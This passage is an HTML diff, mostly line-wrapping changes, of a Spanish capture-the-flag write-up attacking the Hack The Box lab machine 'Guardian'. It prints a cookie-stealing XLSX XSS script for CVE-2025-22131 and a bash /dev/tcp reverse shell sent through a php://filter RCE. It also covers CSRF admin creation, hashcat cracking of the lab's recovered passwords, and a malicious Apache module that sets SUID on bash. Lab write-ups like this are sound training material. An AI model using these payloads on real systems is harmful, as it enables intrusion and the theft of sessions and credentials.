                 <h2>Enumeración Web - Portal Guardian</h2>
-                <p>En <code>guardian.htb</code> hay una web de una universidad. En <code>portal.guardian.htb</code> está el portal de login. El sitio principal de la universidad en <code>guardian.htb</code> no contiene nada particularmente interesante, pero <code>portal.guardian.htb</code> tiene significativamente más superficie de ataque. Ejecutando gobuster revela numerosas rutas interesantes:</p>
-                
-                <p><img src="./media/image9.png" alt="Resultados de enumeración de directorios de gobuster mostrando varios archivos PHP y directorios" /></p>
-                
+                <p>En <code>guardian.htb</code> hay una web de una universidad. En <code>portal.guardian.htb</code> está
+                    el portal de login. El sitio principal de la universidad en <code>guardian.htb</code> no contiene
+                    nada particularmente interesante, pero <code>portal.guardian.htb</code> tiene significativamente más
+                    superficie de ataque. Ejecutando gobuster revela numerosas rutas interesantes:</p>
+
+                <p><img src="./media/image9.png"
+                        alt="Resultados de enumeración de directorios de gobuster mostrando varios archivos PHP y directorios" />
+                </p>
+
                 <h3>Estructura de Directorios</h3>
                 <p>En <code>/models</code>:</p>
                 <ul>
@@ -395,7 +523,7 @@ TypesConfig /etc/mime.types
                     <li><code>/Program.php</code> (Status: 200) [Size: 0]</li>
                     <li><code>/Message.php</code> (Status: 200) [Size: 0]</li>
                 </ul>
-                
+
                 <p>En <code>/admin</code>:</p>
                 <ul>
                     <li><code>/index.php</code> (Status: 200) [Size: 2900]</li>
@@ -410,9 +538,10 @@ TypesConfig /etc/mime.types
                     <li><code>/chats.php</code> (Status: 200) [Size: 2900]</li>
                     <li><code>/createuser.php</code> (Status: 200) [Size: 2900]</li>
                 </ul>
-                
-                <p>La mayoría de estas rutas con tamaño 2900 son redirects a <code>/login</code>, indicando que se requiere autenticación.</p>
-                
+
+                <p>La mayoría de estas rutas con tamaño 2900 son redirects a <code>/login</code>, indicando que se
+                    requiere autenticación.</p>
+
                 <p>En <code>/admin/reports</code> hay archivos más interesantes:</p>
                 <ul>
                     <li><code>/system.php</code> (Status: 200) [Size: 763]</li>
@@ -420,56 +549,74 @@ TypesConfig /etc/mime.types
                     <li><code>/academic.php</code> (Status: 200) [Size: 1198]</li>
                     <li><code>/enrollment.php</code> (Status: 200) [Size: 1628]</li>
                 </ul>
-                
-                <p><img src="./media/image5.png" alt="Páginas de reportes mostrando varios datos académicos y financieros" /></p>
-                
+
+                <p><img src="./media/image5.png"
+                        alt="Páginas de reportes mostrando varios datos académicos y financieros" /></p>
+
                 <p>Aunque contienen datos, nada destaca inmediatamente como útil.</p>
-                
+
                 <h2>Acceso Inicial - Credenciales por Defecto</h2>
-                <p>Durante los primeros segundos en el portal, aparece un PDF con instrucciones de login que indica que la contraseña por defecto es <code>GU1234</code> hasta que los usuarios la cambien. Como <code>guardian.htb</code> tiene testimonios de tres usuarios, pruebo sus nombres de usuario con la contraseña por defecto. Como era de esperar, siempre hay alguien que no cambia sus credenciales por defecto:</p>
-                
+                <p>Durante los primeros segundos en el portal, aparece un PDF con instrucciones de login que indica que
+                    la contraseña por defecto es <code>GU1234</code> hasta que los usuarios la cambien. Como
+                    <code>guardian.htb</code> tiene testimonios de tres usuarios, pruebo sus nombres de usuario con la
+                    contraseña por defecto. Como era de esperar, siempre hay alguien que no cambia sus credenciales por
+                    defecto:</p>
+
                 <pre><code class="language-plaintext">GU0142023:GU1234</code></pre>
-                
-                <p>Esto me otorga acceso al portal de estudiantes. El portal tiene muchas funcionalidades, pero lo que inmediatamente me llama la atención es una sección de tareas pendientes donde se pueden subir archivos - un vector de ataque potencial. También hay una función de chat donde el XSS podría ser posible si un admin u otro estudiante interactúa con él, permitiendo potencialmente el robo de cookies de sesión.</p>
-                
+
+                <p>Esto me otorga acceso al portal de estudiantes. El portal tiene muchas funcionalidades, pero lo que
+                    inmediatamente me llama la atención es una sección de tareas pendientes donde se pueden subir
+                    archivos - un vector de ataque potencial. También hay una función de chat donde el XSS podría ser
+                    posible si un admin u otro estudiante interactúa con él, permitiendo potencialmente el robo de
+                    cookies de sesión.</p>
+
                 <h2>Enumeración de Chats - Divulgación de Información</h2>
-                <p>En la sección de chat hay un selector que muestra todos los usuarios, incluido uno llamado "admin". Al iniciar un chat, noto que la petición va a esta URL:</p>
-                
+                <p>En la sección de chat hay un selector que muestra todos los usuarios, incluido uno llamado "admin".
+                    Al iniciar un chat, noto que la petición va a esta URL:</p>
+
                 <pre><code class="language-plaintext">http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=1</code></pre>
-                
-                <p>Esto revela que mi <code>user_id</code> es 13 y el <code>user_id</code> del admin es 1. Probando cambiando un ID a un valor inexistente como 0 devuelve un error 500 del servidor. Más importante aún, puedo modificar estos IDs para enumerar conversaciones de chat entre admin y otros usuarios iterando a través de diferentes combinaciones de IDs.</p>
-                
+
+                <p>Esto revela que mi <code>user_id</code> es 13 y el <code>user_id</code> del admin es 1. Probando
+                    cambiando un ID a un valor inexistente como 0 devuelve un error 500 del servidor. Más importante
+                    aún, puedo modificar estos IDs para enumerar conversaciones de chat entre admin y otros usuarios
+                    iterando a través de diferentes combinaciones de IDs.</p>
+
                 <p>Descubro esta conversación entre admin y otro usuario:</p>
-                
+
                 <blockquote>
                     <p><strong>jamil.enockson</strong> Sep 29, 2025 21:00<br>
-                    I am doing great, thanks.</p>
+                        I am doing great, thanks.</p>
                     <p><strong>admin</strong> Sep 29, 2025 21:00<br>
-                    Hello! How are you doing today?</p>
+                        Hello! How are you doing today?</p>
                     <p><strong>admin</strong> Sep 29, 2025 21:00<br>
-                    Here is your password for gitea: DHsNnk3V503</p>
+                        Here is your password for gitea: DHsNnk3V503</p>
                 </blockquote>
-                
+
                 <p>Esto me da credenciales:</p>
                 <pre><code class="language-plaintext">jamil.enockson@guardian.htb:DHsNnk3V503</code></pre>
-                
+
                 <h2>Descubrimiento de Gitea - Acceso al Código Fuente</h2>
-                <p>El mensaje del chat menciona Gitea, sugiriendo que está alojado en algún lugar, probablemente como vhost bajo <code>guardian.htb</code>. Añado <code>gitea.guardian.htb</code> a mi archivo <code>/etc/hosts</code> y accedo exitosamente a una instancia de Gitea en esta dirección. La instalación de Gitea ejecuta la versión 1.23.7 y contiene el código fuente tanto de <code>portal.guardian.htb</code> como de <code>guardian.htb</code>.</p>
-                
-                <p>El repositorio de <code>guardian.htb</code> es básico sin nada interesante. Sin embargo, <code>portal.guardian.htb</code> revela información valiosa.</p>
-                
+                <p>El mensaje del chat menciona Gitea, sugiriendo que está alojado en algún lugar, probablemente como
+                    vhost bajo <code>guardian.htb</code>. Añado <code>gitea.guardian.htb</code> a mi archivo
+                    <code>/etc/hosts</code> y accedo exitosamente a una instancia de Gitea en esta dirección. La
+                    instalación de Gitea ejecuta la versión 1.23.7 y contiene el código fuente tanto de
+                    <code>portal.guardian.htb</code> como de <code>guardian.htb</code>.</p>
+
+                <p>El repositorio de <code>guardian.htb</code> es básico sin nada interesante. Sin embargo,
+                    <code>portal.guardian.htb</code> revela información valiosa.</p>
+
                 <h3>Análisis del Código Fuente</h3>
                 <p>En <code>composer.json</code>:</p>
-                
+
                 <pre><code class="language-json">{
     "require": {
         "phpoffice/phpspreadsheet": "3.7.0",
         "phpoffice/phpword": "^1.3"
     }
 }</code></pre>
-                
+
                 <p>En <code>config.php</code>:</p>
-                
+
                 <pre><code class="language-php">&lt;?php
 return [
     'db' => [
@@ -480,14 +627,19 @@ return [
     ],
     'salt' => '8Sb)tM1vs1SS'
 ];</code></pre>
-                
-                <p>Pruebo la contraseña root de MySQL para la cuenta admin tanto en Gitea como en el portal, pero no hay reuso de credenciales en este caso. Sin embargo, anoto el valor del salt para más tarde - se usa universalmente para todos los hashes de contraseñas de usuarios, lo cual será útil si necesito crackear contraseñas de la base de datos.</p>
-                
-                <p>Revisando los archivos de modelos, no encuentro vulnerabilidades obvias de inyección SQL u otro código explotable.</p>
-                
+
+                <p>Pruebo la contraseña root de MySQL para la cuenta admin tanto en Gitea como en el portal, pero no hay
+                    reuso de credenciales en este caso. Sin embargo, anoto el valor del salt para más tarde - se usa
+                    universalmente para todos los hashes de contraseñas de usuarios, lo cual será útil si necesito
+                    crackear contraseñas de la base de datos.</p>
+
+                <p>Revisando los archivos de modelos, no encuentro vulnerabilidades obvias de inyección SQL u otro
+                    código explotable.</p>
+
                 <h2>Enumeración Adicional de Usuarios</h2>
-                <p>Volviendo a la función de chat, enumero todas las conversaciones posibles entre usuarios y encuentro una lista de profesores:</p>
-                
+                <p>Volviendo a la función de chat, enumero todas las conversaciones posibles entre usuarios y encuentro
+                    una lista de profesores:</p>
+
                 <ul>
                     <li>Myra.galsworthy</li>
                     <li>GU9612024</li>
@@ -500,31 +652,43 @@ return [
                     <li>GU9492024</li>
                     <li>Crin.hambidge</li>
                 </ul>
-                
-                <p>Intento hacer login con varias combinaciones usando las contraseñas que he descubierto, pero ninguna tiene éxito.</p>
-                
+
+                <p>Intento hacer login con varias combinaciones usando las contraseñas que he descubierto, pero ninguna
+                    tiene éxito.</p>
+
                 <h2>Explotación XSS - PHPSpreadsheet CVE-2025-22131</h2>
-                <p>Después de revisar exhaustivamente la aplicación sin encontrar vulnerabilidades aparentes, investigo las librerías más a fondo. Me doy cuenta de que había pasado por alto una vulnerabilidad crítica en PHPSpreadsheet que no está parcheada en la versión 3.7.0:</p>
-                
+                <p>Después de revisar exhaustivamente la aplicación sin encontrar vulnerabilidades aparentes, investigo
+                    las librerías más a fondo. Me doy cuenta de que había pasado por alto una vulnerabilidad crítica en
+                    PHPSpreadsheet que no está parcheada en la versión 3.7.0:</p>
+
                 <ul>
-                    <li><a href="https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746">https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746</a></li>
-                    <li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx</a> (incluye PoC)</li>
+                    <li><a
+                            href="https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746">https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746</a>
+                    </li>
+                    <li><a
+                            href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx</a>
+                        (incluye PoC)</li>
                 </ul>
-                
+
                 <h3>Entendiendo la Vulnerabilidad</h3>
-                <p>El exploit funciona abusando de cómo PHPSpreadsheet maneja archivos XLSX con múltiples hojas. Al mostrar la lista de nombres de hojas, la aplicación no los sanitiza, haciéndola vulnerable a ataques XSS. Como el portal permite enviar tareas en formatos DOCX y XLSX, este es un vector de ataque viable.</p>
-                
-                <p>Encuentro una prueba de concepto que demuestra la técnica de explotación: <a href="https://github.com/ZzN1NJ4/CVE-2025-22131-PoC/blob/main/gen.sh">https://github.com/ZzN1NJ4/CVE-2025-22131-PoC/blob/main/gen.sh</a></p>
-                
+                <p>El exploit funciona abusando de cómo PHPSpreadsheet maneja archivos XLSX con múltiples hojas. Al
+                    mostrar la lista de nombres de hojas, la aplicación no los sanitiza, haciéndola vulnerable a ataques
+                    XSS. Como el portal permite enviar tareas en formatos DOCX y XLSX, este es un vector de ataque
+                    viable.</p>
+
+                <p>Encuentro una prueba de concepto que demuestra la técnica de explotación: <a
+                        href="https://github.com/ZzN1NJ4/CVE-2025-22131-PoC/blob/main/gen.sh">https://github.com/ZzN1NJ4/CVE-2025-22131-PoC/blob/main/gen.sh</a>
+                </p>
+
                 <p>El exploit funciona mediante:</p>
                 <ol>
                     <li>Descomprimir un archivo XLSX (que usa XML internamente)</li>
                     <li>Modificar el XML para inyectar JavaScript malicioso</li>
                     <li>Volver a comprimir el archivo</li>
                 </ol>
-                
+
                 <p>Aquí está el script del exploit:</p>
-                
+
                 <pre><code class="language-bash">url=$1
 file="poc.xlsx"
 bad="bad.xlsx"
@@ -538,112 +702,157 @@ sed -i "s|img src=x|img src=x onerror=fetch('${safe_url}?'+document.cookie)|" xl
 
 cp $file $bad
 zip -r $bad xl/workbook.xml</code></pre>
-                
-                <p>Uso este script para crear un archivo XLSX malicioso y lo envío como tarea. Poco después, exfiltro un token de sesión:</p>
-                
+
+                <p>Uso este script para crear un archivo XLSX malicioso y lo envío como tarea. Poco después, exfiltro un
+                    token de sesión:</p>
+
                 <pre><code class="language-bash">python -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.11.84 - - "GET /?PHPSESSID=65eslguj8i1u3ojoj6mklkjleh HTTP/1.1" 200 -</code></pre>
-                
-                <p>Reemplazo mi token de sesión con el capturado y obtengo acceso como el profesor <code>sammy.treat</code>, quien es el profesor del curso que recibió el archivo XLSX.</p>
-                
+
+                <p>Reemplazo mi token de sesión con el capturado y obtengo acceso como el profesor
+                    <code>sammy.treat</code>, quien es el profesor del curso que recibió el archivo XLSX.</p>
+
                 <h2>Explotación CSRF - Creación de Cuenta Admin</h2>
-                <p>Como profesor, tengo privilegios adicionales que los estudiantes no tienen, destacando la capacidad de crear anuncios en un tablón de anuncios. Cuando se crea un anuncio, contiene un enlace que el admin revisa.</p>
-                
-                <p>Después de probar varios enfoques, me doy cuenta de que este es un escenario perfecto para un ataque CSRF. La acción más valiosa para realizar vía CSRF es crear un nuevo usuario, ya que el formulario de creación de usuarios permite especificar el rol del usuario:</p>
-                
-                <p><img src="./media/image8.png" alt="Formulario de creación de usuarios mostrando menú desplegable de selección de rol incluyendo rol admin" /></p>
-                
-                <p>Revisando la lógica de tokens CSRF en el código fuente, noto que los tokens no se borran después de su uso, lo que significa que cualquier token CSRF que encuentre debería funcionar para la petición que quiero que el admin haga.</p>
-                
+                <p>Como profesor, tengo privilegios adicionales que los estudiantes no tienen, destacando la capacidad
+                    de crear anuncios en un tablón de anuncios. Cuando se crea un anuncio, contiene un enlace que el
+                    admin revisa.</p>
+
+                <p>Después de probar varios enfoques, me doy cuenta de que este es un escenario perfecto para un ataque
+                    CSRF. La acción más valiosa para realizar vía CSRF es crear un nuevo usuario, ya que el formulario
+                    de creación de usuarios permite especificar el rol del usuario:</p>
+
+                <p><img src="./media/image8.png"
+                        alt="Formulario de creación de usuarios mostrando menú desplegable de selección de rol incluyendo rol admin" />
+                </p>
+
+                <p>Revisando la lógica de tokens CSRF en el código fuente, noto que los tokens no se borran después de
+                    su uso, lo que significa que cualquier token CSRF que encuentre debería funcionar para la petición
+                    que quiero que el admin haga.</p>
+
                 <h3>Creando el Payload CSRF</h3>
-                <p>Extraigo el token CSRF del formulario de envío de anuncios y creo una página HTML con un formulario de auto-envío:</p>
-                
-                <p><img src="./media/image2.png" alt="Archivo HTML conteniendo payload CSRF que envía automáticamente un formulario para crear un usuario admin" /></p>
-                
-                <p>Alojo este archivo HTML en mi máquina y envío la URL al admin mediante un anuncio. La petición tiene éxito:</p>
-                
+                <p>Extraigo el token CSRF del formulario de envío de anuncios y creo una página HTML con un formulario
+                    de auto-envío:</p>
+
+                <p><img src="./media/image2.png"
+                        alt="Archivo HTML conteniendo payload CSRF que envía automáticamente un formulario para crear un usuario admin" />
+                </p>
+
+                <p>Alojo este archivo HTML en mi máquina y envío la URL al admin mediante un anuncio. La petición tiene
+                    éxito:</p>
+
                 <pre><code class="language-bash">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.11.84 - - "GET / HTTP/1.1" 200 -</code></pre>
-                
+
                 <p>Ahora tengo mi propia cuenta de admin con privilegios completos.</p>
-                
+
                 <h2>LFI a RCE - Wrappers de Filtro PHP</h2>
-                <p>Con acceso de admin, exploro el panel de administración pero no encuentro inmediatamente capacidades obvias de RCE. Sin embargo, revisando el código fuente en Gitea, noto algo interesante en <code>admin/reports</code> - una sentencia <code>include</code> con intento de sanitización:</p>
-                
-                <p><img src="./media/image3.png" alt="Código PHP mostrando sentencia include con intentos de sanitización usando preg_match" /></p>
-                
-                <p>El código intenta prevenir el directory traversal filtrando <code>..</code> y usando un patrón regex con <code>preg_match</code>. Pruebo varias técnicas de bypass para el filtro de <code>..</code> y el regex, pero ninguna funciona directamente.</p>
-                
+                <p>Con acceso de admin, exploro el panel de administración pero no encuentro inmediatamente capacidades
+                    obvias de RCE. Sin embargo, revisando el código fuente en Gitea, noto algo interesante en
+                    <code>admin/reports</code> - una sentencia <code>include</code> con intento de sanitización:</p>
+
+                <p><img src="./media/image3.png"
+                        alt="Código PHP mostrando sentencia include con intentos de sanitización usando preg_match" />
+                </p>
+
+                <p>El código intenta prevenir el directory traversal filtrando <code>..</code> y usando un patrón regex
+                    con <code>preg_match</code>. Pruebo varias técnicas de bypass para el filtro de <code>..</code> y el
+                    regex, pero ninguna funciona directamente.</p>
+
                 <h3>Bypass con Wrappers de PHP</h3>
-                <p>Luego me doy cuenta de que puedo usar wrappers de PHP (<a href="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams">https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams</a>) que no dependen de <code>..</code> para el traversal. Consigo RCE usando el wrapper <code>php://filter</code> con esta URL:</p>
-                
+                <p>Luego me doy cuenta de que puedo usar wrappers de PHP (<a
+                        href="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams">https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams</a>)
+                    que no dependen de <code>..</code> para el traversal. Consigo RCE usando el wrapper
+                    <code>php://filter</code> con esta URL:</p>
+
                 <pre><code class="language-plaintext">http://portal.guardian.htb/admin/reports.php?report=php://filter/{filtros}/resource=reports/enrollment.php&cmd=whoami</code></pre>
-                
-                <p><img src="./media/image7.png" alt="Navegador mostrando ejecución exitosa de comandos vía wrapper de filtro PHP devolviendo 'www-data'" /></p>
-                
+
+                <p><img src="./media/image7.png"
+                        alt="Navegador mostrando ejecución exitosa de comandos vía wrapper de filtro PHP devolviendo 'www-data'" />
+                </p>
+
                 <p>Ahora tengo ejecución de comandos. Lo uso para enviarme una reverse shell:</p>
-                
+
                 <pre><code class="language-plaintext">http://portal.guardian.htb/admin/reports.php?report=php://filter/{filtros}/resource=reports/enrollment.php&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.239/443+0>%261"</code></pre>
-                
+
                 <p>Y recibo exitosamente una shell como <code>www-data</code>.</p>
-                
+
                 <h2>Movimiento Lateral - Cracking de Contraseñas MySQL</h2>
                 <p>Observando los usuarios del sistema:</p>
-                
-                <p><img src="./media/image4.png" alt="Salida mostrando usuarios en el sistema incluyendo jamil, mark, sammy y myra" /></p>
-                
-                <p>Mi objetivo es la base de datos MySQL, para la cual tengo las credenciales root y el valor del salt del archivo de configuración. Me conecto a la base de datos y extraigo el hash de la contraseña del admin:</p>
-                
+
+                <p><img src="./media/image4.png"
+                        alt="Salida mostrando usuarios en el sistema incluyendo jamil, mark, sammy y myra" /></p>
+
+                <p>Mi objetivo es la base de datos MySQL, para la cual tengo las credenciales root y el valor del salt
+                    del archivo de configuración. Me conecto a la base de datos y extraigo el hash de la contraseña del
+                    admin:</p>
+
                 <pre><code class="language-plaintext">694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6</code></pre>
-                
+
                 <p>Con el salt:</p>
                 <pre><code class="language-plaintext">8Sb)tM1vs1SS</code></pre>
-                
+
                 <p>Creo un archivo en el formato <code>hash:salt</code> y uso hashcat para crackearlo:</p>
-                
+
                 <pre><code class="language-bash">hashcat -m 1410 -a 0 -o found.txt hashplussalt.txt /usr/share/wordlists/rockyou.txt</code></pre>
-                
+
                 <p>Hashcat crackea rápidamente el hash, revelando la contraseña:</p>
                 <pre><code class="language-plaintext">fakebake000</code></pre>
-                
-                <p>Pruebo SSH y <code>su</code> con esta contraseña para los cuatro usuarios en la máquina, pero no funciona. Vuelvo a MySQL y extraigo los hashes de contraseñas de los otros usuarios. Consigo crackear exitosamente la contraseña de jamil:</p>
-                
+
+                <p>Pruebo SSH y <code>su</code> con esta contraseña para los cuatro usuarios en la máquina, pero no
+                    funciona. Vuelvo a MySQL y extraigo los hashes de contraseñas de los otros usuarios. Consigo
+                    crackear exitosamente la contraseña de jamil:</p>
+
                 <pre><code class="language-plaintext">jamil:copperhouse56</code></pre>
-                
-                <p>No puedo crackear las contraseñas de mark y sammy, pero las credenciales de jamil me permiten cambiar a ese usuario y recuperar la flag de usuario:</p>
-                
+
+                <p>No puedo crackear las contraseñas de mark y sammy, pero las credenciales de jamil me permiten cambiar
+                    a ese usuario y recuperar la flag de usuario:</p>
+
                 <p><img src="./media/image10.png" alt="Terminal mostrando captura exitosa de la flag user.txt" /></p>
-                
+
                 <h2>Escalada de Privilegios - Hijacking de Script Python</h2>
                 <p>Comprobando privilegios sudo como jamil:</p>
-                
-                <p><img src="./media/image6.png" alt="Salida de sudo -l mostrando que jamil puede ejecutar un script de utilidades Python como mark" /></p>
-                
-                <p>Puedo ejecutar un script Python ubicado en <code>/opt/scripts/utilities.py</code> como el usuario <code>mark</code>. Tanto jamil como mark son miembros del grupo <code>admins</code>.</p>
-                
-                <p>El script en <code>/opt/scripts/utilities</code> incluye <code>utilities.py</code> y dos archivos: <code>output</code> y <code>utils</code>. El script permite ejecutar cuatro funciones Python diferentes del archivo <code>utils</code>. Como uno de estos archivos es escribible por el grupo <code>admins</code>, simplemente añado:</p>
-                
+
+                <p><img src="./media/image6.png"
+                        alt="Salida de sudo -l mostrando que jamil puede ejecutar un script de utilidades Python como mark" />
+                </p>
+
+                <p>Puedo ejecutar un script Python ubicado en <code>/opt/scripts/utilities.py</code> como el usuario
+                    <code>mark</code>. Tanto jamil como mark son miembros del grupo <code>admins</code>.</p>
+
+                <p>El script en <code>/opt/scripts/utilities</code> incluye <code>utilities.py</code> y dos archivos:
+                    <code>output</code> y <code>utils</code>. El script permite ejecutar cuatro funciones Python
+                    diferentes del archivo <code>utils</code>. Como uno de estos archivos es escribible por el grupo
+                    <code>admins</code>, simplemente añado:</p>
+
                 <pre><code class="language-python">os.system("/bin/bash")</code></pre>
-                
+
                 <p>Cuando ejecuto el script de utilidades con sudo, genera una shell bash como <code>mark</code>.</p>
-                
+
                 <h2>Escalada de Privilegios a Root - Carga de Módulo Apache</h2>
                 <p>Como mark, comprobando permisos sudo:</p>
-                
+
                 <pre><code class="language-plaintext">User mark may run the following commands on guardian:
     (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl</code></pre>
-                
-                <p>El binario <code>apache2ctl</code> tiene una entrada en GTFOBins para sudo que típicamente permite leer archivos como root, pero esta versión "safe" parece tener algunos parches personalizados. Probando el comando, encuentro que estoy limitado a la flag <code>-f</code> de apache2ctl, mientras que GTFOBins típicamente usa la flag <code>-c</code>.</p>
-                
+
+                <p>El binario <code>apache2ctl</code> tiene una entrada en GTFOBins para sudo que típicamente permite
+                    leer archivos como root, pero esta versión "safe" parece tener algunos parches personalizados.
+                    Probando el comando, encuentro que estoy limitado a la flag <code>-f</code> de apache2ctl, mientras
+                    que GTFOBins típicamente usa la flag <code>-c</code>.</p>
+
                 <h3>Entendiendo Apache2ctl</h3>
-                <p>El comando <code>apache2ctl</code> se usa para controlar la configuración, estado de Apache y para iniciar, reiniciar o terminar el proceso httpd. Esto permite lanzar servidores httpd personalizados con tu propia configuración. Sin embargo, estando limitado a <code>apache2ctl -f</code> solo permite comprobar el archivo de configuración - no inicia realmente el servidor.</p>
-                
-                <p>Después de investigación extensiva y probar varios enfoques, la única opción viable parece ser crear y cargar un módulo malicioso de Apache que, por ejemplo, establezca el bit SUID en <code>/bin/bash</code>.</p>
-                
+                <p>El comando <code>apache2ctl</code> se usa para controlar la configuración, estado de Apache y para
+                    iniciar, reiniciar o terminar el proceso httpd. Esto permite lanzar servidores httpd personalizados
+                    con tu propia configuración. Sin embargo, estando limitado a <code>apache2ctl -f</code> solo permite
+                    comprobar el archivo de configuración - no inicia realmente el servidor.</p>
+
+                <p>Después de investigación extensiva y probar varios enfoques, la única opción viable parece ser crear
+                    y cargar un módulo malicioso de Apache que, por ejemplo, establezca el bit SUID en
+                    <code>/bin/bash</code>.</p>
+
                 <h3>Módulo Malicioso de Apache</h3>
                 <p>Creo un archivo de configuración de Apache que carga correctamente:</p>
-                
+
                 <pre><code class="language-apache">ServerRoot "/etc/apache2"
 
 # Use port 4000 instead of the default 80
@@ -680,19 +889,23 @@ TypesConfig /etc/mime.types
         Require all granted
     &lt;/Directory&gt;
 &lt;/VirtualHost&gt;</code></pre>
-                
-                <p>Y este código C para el módulo malicioso, que declara un módulo conforme a Apache y usa una tabla de comandos para especificar un handler que establece el bit SUID en bash:</p>
-                
-                <p><img src="./media/image1.png" alt="Código C para módulo malicioso de Apache que establece el bit SUID en /bin/bash" /></p>
-                
+
+                <p>Y este código C para el módulo malicioso, que declara un módulo conforme a Apache y usa una tabla de
+                    comandos para especificar un handler que establece el bit SUID en bash:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="Código C para módulo malicioso de Apache que establece el bit SUID en /bin/bash" /></p>
+
                 <p>Compilo el módulo y ejecuto el comando:</p>
-                
+
                 <pre><code class="language-bash">mark@guardian:~/confs$ sudo safeapache2ctl -f xd.conf
 [Tue Sep 30 17:10:20.869458 2025] [:notice] [pid 6231] Successfully set SUID bit on /bin/bash</code></pre>
-                
-                <p>El módulo establece exitosamente el bit SUID en bash. Ahora puedo obtener la flag de root usando la bash privilegiada:</p>
-                
-                <p><img src="./media/image11.png" alt="Terminal mostrando captura exitosa de la flag root.txt usando bash -p" /></p>
+
+                <p>El módulo establece exitosamente el bit SUID en bash. Ahora puedo obtener la flag de root usando la
+                    bash privilegiada:</p>
+
+                <p><img src="./media/image11.png"
+                        alt="Terminal mostrando captura exitosa de la flag root.txt usando bash -p" /></p>
             </div>
         </article>
     </main>
